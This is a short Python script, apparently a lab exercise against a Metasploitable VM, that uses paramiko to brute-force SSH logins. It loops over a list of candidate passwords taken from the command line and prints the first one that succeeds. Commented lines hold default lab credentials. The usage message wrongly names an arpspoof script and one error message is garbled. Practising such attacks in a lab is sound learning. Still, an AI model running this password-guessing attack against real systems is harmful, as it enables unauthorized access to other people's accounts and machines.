import paramiko
import sys

EXPECTED_ARGUMENT_COUNT = 13

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname='192.168.64.3', username='msfadmin', password='msfadmin')
# stdin, stdout,stderr = ssh.exec_command("uname -a")
# print(stdout.read().decode())
# ssh.close()


def bruteforce_ssh(target, username,  pwds):
    cnt = 1
    for pwd in pwds:
        try:
            ssh.connect(target, username=username, password=pwd)
        except Exception as e:
            cnt += 1
            continue
        print(f"You have successfully connected to {target}!")
        print(f"Password is: {pwd}")
        return
    raise Exception(f"No invalid password for {target}!!!")

def main():
    if len(sys.argv) != EXPECTED_ARGUMENT_COUNT:
        print("Usage: sudo python3 arpspoof.py <Target IP> <Gateway IP>")
        print(f"Error: Expected {EXPECTED_ARGUMENT_COUNT - 1} arguments, but received {len(sys.argv) - 1}.")
        sys.exit(1) # Exit with an error code

    target_ip = sys.argv[1]
    username = sys.argv[2]
    possible_passwords = []
    for i in range(3, EXPECTED_ARGUMENT_COUNT):
        possible_passwords.append(sys.argv[i])

    bruteforce_ssh(target_ip, username, possible_passwords)

    ssh.close()

main()
